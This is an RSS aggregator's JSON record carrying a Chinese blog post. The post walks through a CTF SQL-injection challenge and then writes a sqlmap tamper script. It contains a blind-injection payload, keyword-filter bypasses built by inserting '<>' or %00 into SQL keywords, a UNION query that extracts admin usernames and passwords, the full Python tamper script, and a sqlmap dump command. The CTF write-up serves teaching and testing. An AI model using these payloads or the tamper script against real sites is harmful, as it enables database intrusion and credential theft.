{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-09-07 13:37:40","updatedTime":"2020-09-07 13:37:40","title":"从一道SQLi CTF题到sqlmap tamper的简单编写","link":"https://www.ohlinge.cn/ctf/ctf-sqli-tamper.html","description":"\n<h2>0x01 题目分析</h2>\n<p>题目指明了SQL注入，通过简单尝试，会检测常见关键字，比如单引号、or、and、union、select等：<br />\n<a href=\"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvNzA4MDU5NDcucG5n\" class=\"highslide\" onclick=\"return hs.expand(this,{slideshowGroup:'images'})\"><img src=\"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvNzA4MDU5NDcucG5n\" alt=\"1.png\" /></a><br />\n<a href=\"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvMzQ0Mjg0NzI2OC5wbmc=\" class=\"highslide\" onclick=\"return hs.expand(this,{slideshowGroup:'images'})\"><img src=\"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvMzQ0Mjg0NzI2OC5wbmc=\" alt=\"2.png\" /></a><br />\n首先想到了通过数字盲注来注入，也成功了但是很可惜的是，information_schema和table都被检测到了，所以无法探测数据库结构……</p>\n<pre><code>id=2-(case+when+ascii(substr(database(),%d,1))=%d+then+1+else+2+end)\n</code></pre>\n<p>上面盲注的poc可以获取数据库user等，因为flag位置无法知道，所以直接爆破数据表字段方法就不可行了，还是得找到如何绕过检测关键字的方法。</p>\n<p>后来跟几个朋友交流了一下，得到的结果是这些关键字检测直接通过在它中间加&#34;&#60;&#62;&#34;或&#34;%00&#34;就可以绕过其检测，从而这个注入就简单多了，可以直接联合查询结合元数据表就可以很快探测到数据表信息了。</p>\n<pre><code># 绕过思路\nor =&#62; o&#60;&#62;r\nor =&#62; o%00r\nUNION =&#62; UNIO&#60;&#62;N\nUNION =&#62; UNI%00ON\nSELECT\nFROM\nMIN\nLIMIT\nTABLE\nSLEEP\n……\n</code></pre>\n<p>GET FLAG：</p>\n<pre><code>news.php?id=-1+UNI&#60;&#62;ON+SELE&#60;&#62;CT+1,username,passwo&#60;&#62;rd,4+FR&#60;&#62;OM+adm&#60;&#62;in+LIM&#60;&#62;IT+1,1#\n</code></pre>\n<p><a href=\"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvODQ5MjU2OTU1LnBuZw==\" class=\"highslide\" onclick=\"return hs.expand(this,{slideshowGroup:'images'})\"><img src=\"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvODQ5MjU2OTU1LnBuZw==\" alt=\"3.png\" /></a></p>\n<h2>0x02 编写tamper使用sqlmap注入</h2>\n<p>CTF中遇到此类问题，手注完全应对的过来。但是实战中遇到类似的情况时，手工注入毕竟有限，所以编写tamper来使用SQLMAP注入就很有必要性了。</p>\n<p>tamper规则需求：</p>\n<pre><code class=\"language-python\">1.替换被检测到的关键字为&#34;&#60;xyz&#62;&#60;&#62;&#60;xyz&#62;&#34;\n2.注入字符中存在关键字的情况下，替换关键字，比如information_schema会被检测到存在or而无法注入\n</code></pre>\n<p>编写过程中主要实现这两点即可，最终代码如下：</p>\n<pre><code class=\"language-python\">#!/usr/bin/env python\n#coding=utf-8\n\n&#34;&#34;&#34;\nCopyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)\nSee the file 'doc/COPYING' for copying permission\n用于绕过关键字检测的tamper\n\n&#34;&#34;&#34;\n\nimport random\nimport re\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef tamper(payload, **kwargs):\n    &#34;&#34;&#34;\n    Replaces predefined SQL keywords with representations\n\n    Notes:\n        * Useful to bypass very weak custom filters\n\n    &#62;&#62;&#62; random.seed(0)\n    &#62;&#62;&#62; tamper('1 UNION SELECT 2--')\n    '1 UNI&#60;&#62;ON SEL&#60;&#62;ECT 2--'\n    &#34;&#34;&#34;\n\n    keywords = (&#34;UNION&#34;, &#34;SELECT&#34;, &#34;INSERT&#34;, &#34;UPDATE&#34;, &#34;FROM&#34;,&#34;TABLE&#34;,&#34;AND&#34;,&#34;SLEEP&#34;,&#34;TABLES&#34;,&#34;FROM&#34;,&#34;LIMIT&#34;)\n    retVal = payload\n\n    warnMsg = &#34;currently only couple of keywords are being processed %s. &#34; % str(keywords)\n    warnMsg += &#34;You can set it manually according to your needs&#34;\n    singleTimeWarnMessage(warnMsg)\n\n    if payload:\n        retVal = re.sub(r&#34;(OR)&#34;, &#34;O&#60;&#62;R&#34;, retVal)\n        retVal = re.sub(r&#34;(ADMIN)&#34;, &#34;ADMI&#60;&#62;N&#34;, retVal)\n        for keyword in keywords:\n            _ = random.randint(1, len(keyword) - 1)\n            retVal = re.sub(r&#34;(?i)\\b%s\\b&#34; % keyword, &#34;%s%s%s&#34; % (keyword[:_], '&#60;&#62;', keyword[_:]), retVal)\n\n    return retVal\n</code></pre>\n<p>注入结果：<br />\n<a href=\"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvMjgzMzYwNjg1Ny5wbmc=\" class=\"highslide\" onclick=\"return hs.expand(this,{slideshowGroup:'images'})\"><img src=\"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvMjgzMzYwNjg1Ny5wbmc=\" alt=\"4.png\" /></a><br />\n需要注意的是，sqlmap tamper貌似不会处理传入参数，比如表名、库名、字段名等，这里需要自己写好：</p>\n<pre><code>sqlmap -u &#34;http://********/stage/3/news.php?id=1&#34; --tamper=/usr/local/Cellar/sqlmap/1.1.3/libexec/tamper/anglereplacement.py --dump -C &#34;username,passwo&#60;&#62;rd&#34; -T &#34;admi&#60;&#62;n&#34; -D &#34;ctf001&#34;\n</code></pre>\n<p><a href=\"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvMTMzNDE1MzA5MS5wbmc=\" class=\"highslide\" onclick=\"return hs.expand(this,{slideshowGroup:'images'})\"><img src=\"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvMTMzNDE1MzA5MS5wbmc=\" alt=\"5.png\" /></a></p>\n\n","descriptionType":"html","publishedDate":"Sun, 29 Jul 2018 14:31:00 +0000","feedId":26303,"bgimg":"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvNzA4MDU5NDcucG5n","linkMd5":"01392f0b55fe8f9419a4b22a45ec9d8d","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn50@2020_6/2020/09/07/05-38-44-193_8bf5c6b6c8f9172f.webp","destWidth":901,"destHeight":188,"sourceBytes":16892,"destBytes":8038,"author":"0h1in9e","articleImgCdnMap":{"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvNzA4MDU5NDcucG5n":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn50@2020_6/2020/09/07/05-38-44-193_8bf5c6b6c8f9172f.webp","https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvMzQ0Mjg0NzI2OC5wbmc=":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn64@2020_5/2020/09/07/05-39-46-774_153f97056671eef0.webp","https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvODQ5MjU2OTU1LnBuZw==":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn67@2020_6/2020/09/07/05-38-47-972_6cbfdd6da2bac3c6.webp","https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvMjgzMzYwNjg1Ny5wbmc=":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn60@2020_2/2020/09/07/05-38-47-504_0c0dafbb9ef37a27.webp","https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvMTMzNDE1MzA5MS5wbmc=":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn71@2020_6/2020/09/07/05-38-47-805_4e9e687e643841e6.webp"},"publishedOrCreatedDate":1599457060785}],"record":{"createdTime":"2020-09-07 13:37:40","updatedTime":"2020-09-07 13:37:40","feedId":26303,"fetchDate":"Mon, 07 Sep 2020 05:37:40 +0000","fetchMs":123419,"handleMs":12,"totalMs":250580,"newArticles":0,"totalArticles":10,"status":1,"type":0,"ip":"ec73b7a24802041eef890ee8e1971ea9","hostName":"us-020*","requestId":"a72e90fb69234dc985e4edbdd0b0f652_26303","contentType":"application/rss+xml; charset=UTF-8","totalBytes":64838,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":5,"articlesImgsGithubTotal":5,"successGithubMap":{"myreaderx7":1,"myreaderx6":1,"myreaderx32":1,"myreaderx22":1,"myreaderx24":1},"failGithubMap":{}},"feed":{"createdTime":"2020-09-07 02:38:11","updatedTime":"2020-09-07 04:37:21","id":26303,"name":"0h1in9e' s Blog | 林歌博客","url":"https://www.ohlinge.cn/feed/","subscriber":125,"website":null,"icon":"https://www.ohlinge.cn/favicon.ico","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx61/cdn55@2020_1/2020/09/06/20-37-11-798_9699534b45694544.ico","description":"0h1in9e's Blog ","weekly":null,"link":null},"noPictureArticleList":[],"tmpCommonImgCdnBytes":8038,"tmpBodyImgCdnBytes":56800,"tmpBgImgCdnBytes":0,"extra4":{"start":1599456936994,"total":0,"statList":[{"spend":123779,"msg":"获取xml内容"},{"spend":12,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":62535,"msg":"正文链接上传到cdn"}]},"extra5":5,"extra6":5,"extra7ImgCdnFailResultVector":[null,null],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-006.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-018.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe69.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-57.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvNzA4MDU5NDcucG5n","sourceStatusCode":200,"destWidth":901,"destHeight":188,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn50@2020_6/2020/09/07/05-38-44-193_8bf5c6b6c8f9172f.webp","sourceBytes":16892,"destBytes":8038,"targetWebpQuality":75,"feedId":26303,"totalSpendMs":4066,"convertSpendMs":12,"createdTime":"2020-09-07 13:38:40","host":"us-021*","referer":"https://www.ohlinge.cn/ctf/ctf-sqli-tamper.html","linkMd5ListStr":"01392f0b55fe8f9419a4b22a45ec9d8d,01392f0b55fe8f9419a4b22a45ec9d8d","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"16.5 KB","destSize":"7.8 KB","compressRate":"47.6%"},{"code":1,"isDone":false,"source":"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvMjgzMzYwNjg1Ny5wbmc=","sourceStatusCode":200,"destWidth":529,"destHeight":191,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn60@2020_2/2020/09/07/05-38-47-504_0c0dafbb9ef37a27.webp","sourceBytes":32148,"destBytes":15778,"targetWebpQuality":75,"feedId":26303,"totalSpendMs":3289,"convertSpendMs":11,"createdTime":"2020-09-07 13:38:45","host":"us-018*","referer":"https://www.ohlinge.cn/ctf/ctf-sqli-tamper.html","linkMd5ListStr":"01392f0b55fe8f9419a4b22a45ec9d8d","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"31.4 KB","destSize":"15.4 KB","compressRate":"49.1%"},{"code":1,"isDone":false,"source":"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvMTMzNDE1MzA5MS5wbmc=","sourceStatusCode":200,"destWidth":785,"destHeight":216,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn71@2020_6/2020/09/07/05-38-47-805_4e9e687e643841e6.webp","sourceBytes":28591,"destBytes":18138,"targetWebpQuality":75,"feedId":26303,"totalSpendMs":3703,"convertSpendMs":11,"createdTime":"2020-09-07 13:38:45","host":"europe-57*","referer":"https://www.ohlinge.cn/ctf/ctf-sqli-tamper.html","linkMd5ListStr":"01392f0b55fe8f9419a4b22a45ec9d8d","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"27.9 KB","destSize":"17.7 KB","compressRate":"63.4%"},{"code":1,"isDone":false,"source":"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvODQ5MjU2OTU1LnBuZw==","sourceStatusCode":200,"destWidth":1142,"destHeight":246,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn67@2020_6/2020/09/07/05-38-47-972_6cbfdd6da2bac3c6.webp","sourceBytes":26462,"destBytes":15438,"targetWebpQuality":75,"feedId":26303,"totalSpendMs":3812,"convertSpendMs":14,"createdTime":"2020-09-07 13:38:45","host":"europe69*","referer":"https://www.ohlinge.cn/ctf/ctf-sqli-tamper.html","linkMd5ListStr":"01392f0b55fe8f9419a4b22a45ec9d8d","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"25.8 KB","destSize":"15.1 KB","compressRate":"58.3%"},{"code":1,"isDone":false,"source":"https://www.ohlinge.cn/action/Watermark?mark=L3Vzci91cGxvYWRzLzIwMTgvMDcvMzQ0Mjg0NzI2OC5wbmc=","sourceStatusCode":200,"destWidth":812,"destHeight":136,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn64@2020_5/2020/09/07/05-39-46-774_153f97056671eef0.webp","sourceBytes":15674,"destBytes":7446,"targetWebpQuality":75,"feedId":26303,"totalSpendMs":2350,"convertSpendMs":19,"createdTime":"2020-09-07 13:39:45","host":"us-018*","referer":"https://www.ohlinge.cn/ctf/ctf-sqli-tamper.html","linkMd5ListStr":"01392f0b55fe8f9419a4b22a45ec9d8d","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"15.3 KB","destSize":"7.3 KB","compressRate":"47.5%"}],"successGithubMap":{"myreaderx7":1,"myreaderx6":1,"myreaderx32":1,"myreaderx22":1,"myreaderx24":1},"failGithubMap":{}}